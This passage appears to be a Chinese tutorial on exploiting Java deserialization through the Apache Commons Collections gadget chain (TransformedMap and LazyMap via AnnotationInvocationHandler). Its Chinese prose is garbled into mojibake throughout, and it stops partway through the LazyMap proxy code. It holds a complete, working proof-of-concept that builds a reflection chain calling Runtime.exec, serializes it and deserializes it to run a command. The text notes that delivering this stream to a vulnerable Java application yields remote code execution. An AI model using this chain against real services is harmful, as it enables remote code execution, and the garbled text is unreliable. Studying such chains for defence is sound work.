å†åˆ†æInvokerTransformerä¸­çš„transformæ–¹æ³•å¯ä»¥å‘ç°ï¼Œè¿™åœ°æ–¹å°±æ˜¯é€šè¿‡ç»™å®šçš„objectï¼Œç„¶åé€šè¿‡.getClassã€.getMethodã€.invokeçš„æ–¹æ³•è¿›è¡Œåå°„ï¼Œè¾¾åˆ°è°ƒç”¨æŒ‡å®šæ–¹æ³•çš„ç›®çš„ã€‚ æ‰€ä»¥æˆ‘ä»¬æ„é€ çš„ChainedTransformerçš„é“¾ä¸­ï¼Œæœ€ç»ˆçš„æ‰§è¡Œåº”è¯¥æ˜¯ç±»ä¼¼äºï¼š ((Runtime)Runtime.class.getMethod(\"getRuntime\").invoke(Runtime.class)).exec(\"open -na Calculator\"); å› æ­¤é“¾çš„ç¬¬ä¸€æ­¥ï¼Œå°±æ˜¯è·å–Runtimeçš„ç±»ï¼Œå¯ä»¥é€šè¿‡å†…ç½®çš„ConstantTransformeræ¥è·å– è¿™æ—¶é“¾å°±å˜æˆäº† Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class) }; Transformer transformerChain = new ChainedTransformer(transformers); ç¬¬äºŒæ­¥å°±æ˜¯é€šè¿‡InvokerTransformeræ¥åå°„è°ƒç”¨getMethodæ–¹æ³•ï¼Œå‚æ•°æ˜¯getRuntimeï¼Œä»¥æ­¤æ¥è·å–åˆ°Runtime.class.getMethod(\"getRuntime\")ï¼Œä¸Šé¢ä¹Ÿæè¿‡ï¼ŒInvokerTransformerå…±æ¥å—3ä¸ªå‚æ•° ç¬¬â¼€ä¸ªå‚æ•°æ˜¯å¾…æ‰§â¾çš„â½…æ³•åï¼Œæ­¤å¤„åˆ™ä¸ºgetMethod ç¬¬â¼†ä¸ªå‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹ï¼ŒæŸ¥çœ‹getMethodæ–¹æ³•çš„å®šä¹‰ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²Stringï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯Classï¼Œä»£è¡¨ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯å˜ç±»å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯Class[].classï¼Œæ‰€ä»¥æ­¤å¤„åº”å†™ä¸ºnew Class[] {String.class, Class[].class} ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¼ ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨ï¼Œä¸ºè°ƒç”¨getMethodæ—¶å€™å®é™…ä¼ å…¥çš„å‚æ•°ï¼ˆéœ€è¦å’Œç¬¬äºŒæ­¥é‡Œé¢ç»Ÿä¸€ï¼‰ï¼Œå³ä¸ºnew Object[]{\"getRuntime\", new Class[0]}ï¼ˆnew Class[0]å¯ä»¥ç†è§£ä¸ºå ä½ç¬¦ï¼Œå¦‚æœç»™è¿™ä¸ªå‡½æ•°ä¼ å…¥nullçš„è¯ï¼Œä¼šç›´æ¥æŠ›å‡ºç©ºæŒ‡é’ˆå¼‚å¸¸ï¼›å¦‚æœä¼ å…¥new Class[0]çš„è¯å°±ä¸ä¼šæŠ›å¼‚å¸¸ã€‚ï¼‰ å› æ­¤æ­¤æ—¶çš„é“¾å°±å˜æˆäº† Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}) }; Transformer transformerChain = new ChainedTransformer(transformers); ç„¶åç”¨åŒæ ·çš„æ–¹æ³•æ„é€ å‡º.invoke(Runtime.class))å’Œ.exec(\"open -na Calculator\")å³å¯ å†ä¸¾ä¸€ä¸ªæ„é€ InvokerTransformerçš„ä¾‹å­ï¼Œ.invoke(Runtime.class))å§ ç¬¬ä¸€ä¸ªå‚æ•°æ–¹æ³•åï¼šinvoke ç¬¬äºŒä¸ªå‚æ•°å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹ï¼šnew Class[]{Object.class, Object[].class} ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯ä¼ å…¥çš„å‚æ•°åˆ—è¡¨ï¼Œæ­¤å¤„æ˜¯Runtime.classï¼Œå†™æˆï¼šnew Object[]{Runtime.class, new Object[0]} æœ€ç»ˆçš„é“¾ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); é“¾æ„é€ å¥½äº†ï¼Œåªéœ€è¦æ„é€ ä¸€ä¸ªä½¿ç”¨è¿™ä¸ªé“¾çš„TransformedMapçš„å¯¹è±¡ï¼Œç„¶åä¿®æ”¹é‡Œé¢çš„å†…å®¹å³å¯è§¦å‘å‘½ä»¤æ‰§è¡Œäº†ã€‚ Map innerMap = new HashMap(); innerMap.put(\"1\", \"2\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"3\", \"4\"); æ•ˆæœ ç®€åŒ–é“¾ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; ä¸Šâ¾¯çš„å‘½ä»¤æ‰§â¾åªæ˜¯ä¸€ä¸ªdemoï¼Œå®ƒåªæ˜¯â¼€ä¸ªâ½¤æ¥åœ¨æœ¬åœ°æµ‹è¯•çš„ç±»ï¼Œæ˜¯ä¸èƒ½ç›´æ¥åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œçš„ã€‚ åœ¨å®é™…è¿‡ç¨‹ä¸­ï¼Œæ˜¯éœ€è¦ç»“åˆååºåˆ—åŒ–æ¼æ´ï¼Œå°†ä¸Šâ¾¯æœ€ç»ˆâ½£æˆçš„outerMapå¯¹è±¡å˜æˆâ¼€ä¸ªåºåˆ—åŒ–æµè®©ç›®æ ‡è¿›è¡Œååºåˆ—åŒ–ï¼Œè¾¾åˆ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚ ä½¿ç”¨AnnotationInvocationHandlerè§¦å‘ååºåˆ—åŒ– ç¯å¢ƒè¦æ±‚ï¼šJDK 1.7 ä¸‹è½½åœ°å€ï¼Œå»ºè®®é€‰JDK 7u21 åˆ†æ åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»æ„é€ å‡ºäº†å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„æ¶æ„é“¾ã€‚ åˆ°è¿™ä¸€æ­¥ï¼Œæ­£å¸¸çš„ä»£ç å®¡è®¡è¿‡ç¨‹ä¸­ï¼Œä¼šé‡‡å–ä¸¤ç§ç­–ç•¥ï¼Œä¸€ç§æ˜¯ç»§ç»­å‘ä¸Šå›æº¯ï¼Œæ‰¾transformKeyã€transformValueã€checkSetValueè¿™å‡ ä¸ªæ–¹æ³•è¢«è°ƒç”¨çš„ä½ç½®ï¼Œå¦ä¸€ç§ç­–ç•¥å°±æ˜¯å…¨å±€æœç´¢readObject()æ–¹æ³•ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å“ªä¸ªç±»ç›´æ¥å°±è°ƒç”¨äº†è¿™ä¸‰ä¸ªæ–¹æ³•ä¸­çš„ä¸€ä¸ªæˆ–è€…readObjectä¸­æœ‰å¯ç–‘çš„æ“ä½œï¼Œæœ€åèƒ½å¤Ÿé—´æ¥è§¦å‘è¿™å‡ ä¸ªæ–¹æ³•ã€‚å®¡è®¡ä¸­ï¼Œä¸€èˆ¬éƒ½ä¼šæŠŠä¸¤ç§ç­–ç•¥éƒ½è¯•ä¸€éã€‚ ç°åœ¨åªè¦æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆä»¥ä¸‹æ¡ä»¶çš„ç±»ï¼Œå¹¶ä¸”æœåŠ¡ç«¯æœ‰ååºåˆ—åŒ–çš„å…¥å£ï¼Œå°±å¯ä»¥RCEäº†ã€‚ è¯¥å¯åºåˆ—åŒ–çš„ç±»é‡å†™äº†readObjectæ–¹æ³•ï¼› è¯¥ç±»åœ¨readObjectæ–¹æ³•ä¸­å¯¹Mapç±»å‹çš„å˜é‡è¿›è¡Œäº†é”®å€¼ä¿®æ”¹æ“ä½œï¼Œå¹¶ä¸”è¿™ä¸ªMapå‚æ•°æ˜¯å¯æ§çš„ï¼› æ ¹æ®ä¸Šé¢çš„æ¡ä»¶ï¼Œå¤§ä½¬ä»¬æ‰¾åˆ°äº†rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.classè¿™ä¸ªç±»ï¼› è¿™ä¸ªç±»æœ‰ä¸€ä¸ªæˆå‘˜å˜é‡ memberValuesæ˜¯Mapç±»å‹ï¼Œå¹¶ä¸”åœ¨é‡å†™çš„ readObject() æ–¹æ³•ä¸­æœ‰ memberValue.setValue() ä¿®æ”¹Valueçš„æ“ä½œã€‚ æ³¨æ„è¿™ä¸ªå¿…é¡»è¦JDK7ï¼ŒJDK8æ˜¯æ²¡æœ‰è¿™ä¸ªé—®é¢˜çš„ æ ¹æ®åˆšæ‰çš„åå°„execç« èŠ‚ æ ¸å¿ƒçš„é€»è¾‘å°±æ˜¯ï¼š å®ä¾‹åŒ–ä¸€ä¸ªAnnotationInvocationHandlerç±»ï¼Œå°†å…¶æˆå‘˜å˜é‡memberValuesèµ‹å€¼ä¸ºç²¾å¿ƒæ„é€ çš„æ¶æ„TransformedMapå¯¹è±¡ã€‚ç„¶åå°†å…¶åºåˆ—åŒ–ï¼Œæäº¤ç»™æœªåšå®‰å…¨æ£€æŸ¥çš„Javaåº”ç”¨ã€‚Javaåº”ç”¨åœ¨è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œæ‰§è¡Œäº†readObject()å‡½æ•°ï¼Œä¿®æ”¹äº†Mapçš„Valueï¼Œåˆ™ä¼šè§¦å‘TransformedMapçš„å˜æ¢å‡½æ•°transform()ï¼Œå†é€šè¿‡åå°„é“¾è°ƒç”¨äº†Runtime.getRuntime.exec(\"XXX\") å‘½ä»¤ï¼Œæœ€ç»ˆå°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„ä»»æ„ä»£ç äº†ã€‚ POCæ„å»ºè¿‡ç¨‹ é€šè¿‡åå°„è°ƒç”¨AnnotationInvocationHandlerçš„æ„é€ å‡½æ•°ï¼Œç»™æ„é€ çš„æ¶æ„é“¾ä¼ è¿›æ„é€ å‚æ•°ä¸­ï¼Œç”Ÿæˆå¯¹è±¡oï¼› AnnotationInvocationHandler æ„é€ å‡½æ•° Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Retention.class, outerMap); // æš‚æ—¶ç”¨Retention.classï¼Œåé¢ä¼šåˆ†æä¸ºå•¥ å¯¹å¯¹è±¡oè¿›è¡Œåºåˆ—åŒ– ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); ä½†æ˜¯åœ¨writeObjectçš„æ—¶å€™æŠ¥äº†ä¸€ä¸ªååºåˆ—åŒ–çš„é”™è¯¯ï¼š ä¸»è¦åŸå› æ˜¯å› ä¸ºRuntimeç±»æ˜¯æ²¡æœ‰å®ç° java.io.Serializable æ¥â¼çš„ï¼Œæ‰€ä»¥æ˜¯ä¸å…è®¸è¢«åºåˆ—åŒ–ã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„æ¥è·å–åˆ°å½“å‰ä¸Šä¸‹â½‚ä¸­çš„Runtimeå¯¹è±¡ï¼Œâ½½ä¸éœ€è¦ç›´æ¥ä½¿â½¤è¿™ä¸ªç±»ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬æœ€å¼€å§‹çš„POCç¤ºä¾‹ä¸­çš„Transformer[]ï¼‰ï¼š Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; å¯ä»¥çœ‹åˆ°æˆåŠŸåºåˆ—åŒ–äº†ï¼Œä½†æ˜¯ååºåˆ—åŒ–åå¹¶æ²¡æœ‰è§¦å‘è®¡ç®—å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¹¶æ²¡æœ‰æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚ è§£å†³æ€è·¯ï¼šè§¦å‘éœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š sun.reflect.annotation.AnnotationInvocationHandleræ„é€ å‡½æ•°çš„ç¬¬â¼€ä¸ªå‚æ•°å¿…é¡»æ˜¯ Annotationçš„â¼¦ç±»ï¼Œä¸”å…¶ä¸­å¿…é¡»å«æœ‰â¾„å°‘â¼€ä¸ªâ½…æ³•ï¼Œå‡è®¾â½…æ³•åæ˜¯Xï¼› è¢«TransformedMap.decorateä¿®é¥°çš„Mapä¸­å¿…é¡»æœ‰â¼€ä¸ªé”®åä¸ºXçš„å…ƒç´ ã€‚ ä¸æ‡‚ä¸ºä»€ä¹ˆå¿…é¡»è¦è¿™æ ·ï¼Œè°ƒè¯•åˆ†æä¸€ä¸‹ã€‚ æŸ¥çœ‹readObjectä»£ç ï¼Œå‘ç°åœ¨setValueå‰æœ‰ä¸¤ä¸ªifè¯­å¥ if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); } } å…ˆåœ¨ if (var7 != null)è¿™ä¸‹æ–­ç‚¹ï¼Œç„¶åè°ƒè¯•ï¼Œå‘ç° var7 ç¡®å®æ˜¯ nullï¼Œæ‰€ä»¥æ²¡æœ‰æ‰§è¡Œå‘½ä»¤æˆåŠŸ åˆ†æä¸€ä¸‹ï¼Œvar7å€¼æ˜¯ä»var3.get(var6)è·å–æ¥çš„ var3æ˜¯ä¸€ä¸ªmapï¼Œé”®æ˜¯æˆ‘ä»¬æ„é€ AnnotationInvocationHandlerå¯¹è±¡ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ï¼ˆRetention.classï¼‰ä¸­çš„æ–¹æ³•åï¼ˆè¿™é‡Œæ˜¯valueï¼‰ï¼Œè€Œå€¼å°±æ˜¯è¿™ä¸ªæ–¹æ³•returnçš„ç±»ï¼ˆè¿™é‡Œæ˜¯class java.lang.annotation.RetentionPolicyï¼‰ã€‚ var6åˆ™æ˜¯æˆ‘ä»¬åˆ›å»ºinnerMapæ—¶putçš„é”®å€¼å¯¹ä¸­çš„é”® æ”¾ä¸ªå›¾å¤§æ¦‚è¯´æ˜ä¸‹ï¼š æ‰€ä»¥åªéœ€è¦æˆ‘ä»¬åˆ›å»ºçš„innerMapä¸­çš„é”®åŒ…å«åœ¨var3çš„é”®ä¸­å³å¯ï¼Œä¹Ÿå°±æ˜¯è¯´innerMapä¸­çš„é”®å¿…é¡»æ˜¯AnnotationInvocationHandleræ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆè¿™é‡Œæ˜¯Retention.classï¼‰å¯¹åº”ç±»ä¸­çš„æ–¹æ³•åvalue æ„é€ innerMapåƒä¸‹å›¾è¿™æ · å†è°ƒä¸€ä¸‹ï¼Œè¿™ä¸ªæ—¶å€™çš„var7æ»¡è¶³ä¸ç­‰äºnulläº† ç„¶åçœ‹ç¬¬äºŒä¸ªifè¯­å¥ éœ€è¦æ»¡è¶³æ¡ä»¶ï¼š var7.isInstance(var8) ==> false // æ»¡è¶³ç¬¬ä¸€ä¸ªifæ¡ä»¶åï¼Œvar7å°±æ˜¯innerMapä¸­è¾“å…¥çš„é”®å€¼å¯¹åº”Annotationå­ç±»æ–¹æ³•è¿”å›çš„ç±»å‹ï¼Œä¹Ÿå°±æ˜¯var3å¯¹åº”é”®çš„å€¼ var8 instanceof ExceptionProxy ==> false // var8å°±æ˜¯æˆ‘ä»¬åˆ›å»ºçš„innerMapä¸­è¾“å…¥çš„é”®å€¼å¯¹ä¸­çš„å€¼ è¿™ä¸ªå°±æ¯”è¾ƒç®€å•ï¼Œæ»¡è¶³æ¡ä»¶å³å¯ã€‚ åˆ°è¿™å°±æ¯”è¾ƒæ¸…æ¥šååºåˆ—åŒ–åé¢2ä¸ªifè¯­å¥çš„é™åˆ¶äº†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„Annotationçš„å­ç±»å³å¯ï¼Œä¸¾ä¸ªä¾‹å­ï¼š éšä¾¿æ‰¾ä¸ªAnnotationå­ç±» æ„å»ºå¯¹è±¡ // æ„å»ºå¯¹è±¡ Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Action.class, outerMap); æŸ¥çœ‹Action.classçš„æºç  ä½¿ç”¨æ–¹æ³•inputï¼Œè¿”å›ç±»å‹æ˜¯Stringï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ›å»ºçš„innerMapçš„putçš„é”®å€¼å¯¹ä¸­ï¼Œé”®æ˜¯input ç”±äºvar7.isInstance(var8) ==> falseï¼Œæ‰€ä»¥æˆ‘ä»¬innerMapçš„putçš„é”®å€¼å¯¹ä¸­çš„å€¼ç±»å‹ä¸èƒ½æ˜¯String æ‰€ä»¥æ„é€ å¦‚ä¸‹ï¼š Map innerMap = new HashMap(); innerMap.put(\"input\", 1); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); è¿è¡Œ æˆåŠŸååºåˆ—åŒ–æ‰§è¡Œäº†å‘½ä»¤ã€‚ å®Œæ•´POC package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.ws.Action; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException { System.out.println(String.class.isInstance(\"\")); // åˆ©ç”¨é“¾ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"input\", 1); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // æ„å»ºå¯¹è±¡ Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Action.class, outerMap); // åºåˆ—åŒ– ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // ååºåˆ—åŒ– ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); } } æ•´ä½“æ€è·¯ æˆ‘ä»¬æ„é€ æ¶æ„çš„AnnotationInvocationHandlerç±»ï¼Œå°†è¯¥ç±»çš„æˆå‘˜å˜é‡memberValuesèµ‹å€¼ä¸ºæˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„TransformedMapå¯¹è±¡ï¼Œå¹¶å°†AnnotationInvocationHandlerç±»è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åäº¤ç»™ç›®æ ‡JAVA WEBåº”ç”¨è¿›è¡Œååºåˆ—åŒ–ã€‚åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¼šæ‰§è¡ŒreadObject()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šå¯¹æˆå‘˜å˜é‡TransformedMapçš„Valueå€¼è¿›è¡Œä¿®æ”¹ï¼Œè¯¥ä¿®æ”¹è§¦å‘äº†TransformedMapå®ä¾‹åŒ–æ—¶ä¼ å…¥çš„å‚æ•°InvokerTransformerçš„transform()æ–¹æ³•ï¼ŒInvokerTransformer.transform()æ–¹æ³•é€šè¿‡åå°„é“¾è°ƒç”¨Runtime.getRuntime.exec(â€œxxâ€)å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ ä½¿ç”¨LazyMapåˆ©ç”¨é“¾ ä»‹ç» LazyMapå’ŒTransformedMapç±»ä¼¼ï¼Œéƒ½ç»§æ‰¿ AbstractMapDecoratorã€‚ è€ŒTransformedMapæ˜¯åœ¨å†™å…¥å…ƒç´ çš„æ—¶å€™æ‰§è¡Œtransformæ–¹æ³•ï¼ŒLazyMapæ˜¯åœ¨å…¶getæ–¹æ³•ä¸­æ‰§è¡Œçš„ this.factory.transformã€‚ LazyMapçš„ä½œç”¨æ˜¯â€œæ‡’åŠ è½½â€ï¼Œåœ¨getæ‰¾ä¸åˆ°å€¼çš„æ—¶å€™ï¼Œå®ƒä¼šè°ƒç”¨ this.factory.transform æ–¹æ³•å»è·å–ä¸€ä¸ªå€¼ public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } è€Œthis.factoryä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œåœ¨æ„é€ å‡½æ•°ä¸­ã€‚ protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\"Factory must not be null\"); } else { this.factory = factory; } } æ‰€ä»¥æ„é€ pocçš„æ—¶å€™åªè¦ä»¤factoryä¸ºç²¾å¿ƒæ„é€ çš„ChainedTransformerå°±è¡Œï¼Œå› æ­¤æˆ‘ä»¬æ‰¾ä¸€ä¸‹å“ªé‡Œå¯èƒ½è°ƒç”¨äº†LazyMapçš„getæ–¹æ³•ã€‚ ä½†æ˜¯æˆ‘ä»¬åœ¨AnnotationInvocationHandler#readObjectå‡½æ•°ä¸­å¹¶æ²¡æœ‰çœ‹åˆ°æœ‰æ‰§è¡Œgetæ–¹æ³•ï¼Œæ‰€ä»¥ysoserialæ‰¾åˆ°äº†å¦ä¸€æ¡è·¯ï¼ŒAnnotationInvocationHandlerç±»çš„invokeæ–¹æ³•æœ‰è°ƒç”¨åˆ°getï¼š AnnotationInvocationHandler#invokeçœ‹åˆ°invokeæ–¹å‘å°±å¤§æ¦‚è”æƒ³åˆ°Javaçš„åŠ¨æ€ä»£ç†æœºåˆ¶ã€‚ åŠ¨æ€ä»£ç†å¤ä¹  æ€»ç»“ä¸ºä¸€å¥è¯å°±æ˜¯ï¼Œè¢«åŠ¨æ€ä»£ç†çš„å¯¹è±¡è°ƒç”¨ä»»æ„æ–¹æ³•éƒ½ä¼šé€šè¿‡å¯¹åº”çš„InvocationHandlerçš„invokeæ–¹æ³•è§¦å‘ è¿™é‡Œå†ä¸¾ä¸ªä¾‹å­è¯´æ˜ä¸€ä¸‹å¦‚ä½•è‡ªåŠ¨è°ƒç”¨çš„invokeæ–¹æ³• InvocationHandlerExample.class InvocationHandlerExampleç±»ç»§æ‰¿äº†InvocationHandlerï¼Œå®ç°äº†invokeæ–¹æ³•ï¼Œä½œç”¨æ˜¯åœ¨ç›‘æ§åˆ°è°ƒç”¨çš„æ–¹æ³•åæ˜¯getçš„æ—¶å€™ï¼Œè¿”å›ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ä¸² Hacked Object ã€‚ package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.Map; public class InvocationHandlerExample implements InvocationHandler { protected Map map; public InvocationHandlerExample(Map map){ this.map = map; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if (method.getName().compareTo(\"get\") == 0){ System.out.println(\"HOOK Method: \" + method.getName()); return \"Hacked Object\"; } return method.invoke(this.map, args); } } App.class åœ¨Appç±»ä¸­è°ƒç”¨è¿™ä¸ªInvocationHandlerExample package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) { InvocationHandler handler = new InvocationHandlerExample(new HashMap()); // ä»£ç†ç±»çš„é€»è¾‘ Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); proxyMap.put(\"1\", \"2\"); System.out.println(proxyMap.get(\"1\")); } } å¯ä»¥çœ‹åˆ°è°ƒç”¨çš„getæ–¹æ³•ï¼Œä½†æ˜¯è¢«æˆ‘ä»¬åŠ¨æ€ä»£ç†ä¸­çš„invokeæ–¹æ³•æ‹¦æˆªäº†ï¼Œè¿”å›äº†Hacked Object ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªMapå¯¹è±¡ç»è¿‡åŠ¨æ€ä»£ç†å¤„ç†ä¹‹åï¼ŒåŠ¨æ€ä»£ç†å¯¹è±¡è°ƒç”¨ä»»ä½•ä¸€ä¸ªæ–¹æ³•æ—¶ä¼šè°ƒç”¨handlerä¸­çš„invokeæ–¹æ³•ã€‚ æˆ‘ä»¬å›çœ‹sun.reflect.annotation.AnnotationInvocationHandlerï¼Œä¼šå‘ç°å®é™…ä¸Šè¿™ä¸ªç±»å®é™…å°±æ˜¯ä¸€ä¸ªInvocationHandlerï¼Œæˆ‘ä»¬å¦‚æœå°†è¿™ä¸ªå¯¹è±¡ç”¨Proxyè¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆåœ¨readObjectçš„æ—¶å€™ï¼Œåªè¦è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥åˆ°AnnotationInvocationHandler#invokeæ–¹æ³•ä¸­ï¼Œè¿›è€Œè§¦å‘æˆ‘ä»¬çš„LazyMap#getã€‚ æ‰€ä»¥æˆ‘ä»¬åªè¦åˆ›å»ºä¸€ä¸ªLazyMapçš„åŠ¨æ€ä»£ç†ï¼Œç„¶åå†ç”¨åŠ¨æ€ä»£ç†è°ƒç”¨LazyMapçš„æŸä¸ªæ–¹æ³•å°±è¡Œäº†ï¼Œä½†æ˜¯ä¸ºäº†ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨è§¦å‘ï¼Œæˆ‘ä»¬åº”è¯¥æ‰¾çš„æ˜¯æŸä¸ªé‡å†™äº†readObjectæ–¹æ³•çš„ç±»ï¼Œè¿™ä¸ªç±»çš„readObjectæ–¹æ³•ä¸­å¯ä»¥é€šè¿‡åŠ¨æ€ä»£ç†è°ƒç”¨LazyMapçš„æŸä¸ªæ–¹æ³•ï¼Œå…¶å®è¿™å’Œç›´æ¥è°ƒç”¨LazyMapæŸä¸ªæ–¹æ³•éœ€è¦æ»¡è¶³çš„æ¡ä»¶å‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºæŸä¸ªç±»çš„åŠ¨æ€ä»£ç†ä¸å®ƒæœ¬èº«å®ç°äº†åŒä¸€ä¸ªæ¥å£ã€‚è€Œæˆ‘ä»¬é€šè¿‡åˆ†æTransformedMapåˆ©ç”¨é“¾çš„æ—¶å€™ï¼Œå·²ç»çŸ¥é“äº†åœ¨AnnotationInvocationHandlerçš„readObjectæ–¹æ³•ä¸­ä¼šè°ƒç”¨æŸä¸ªMapç±»å‹å¯¹è±¡çš„entrySet()æ–¹æ³•ï¼Œè€ŒLazyMapä»¥åŠä»–çš„åŠ¨æ€ä»£ç†éƒ½æ˜¯Mapç±»å‹ï¼Œæ‰€ä»¥ï¼Œä¸€æ¡åˆ©ç”¨é“¾å°±è¿™ä¹ˆå‡ºæ¥äº† æ„å»ºPOC å¯¹sun.reflect.annotation.AnnotationInvocationHandlerå¯¹è±¡è¿›è¡ŒProxy // æ„å»ºå¯¹è±¡ Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // åˆ›å»ºLazyMapçš„handlerå®ä¾‹ InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap); // åˆ›å»ºLazyMapçš„åŠ¨æ€ä»£ç†å®ä¾‹ Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // 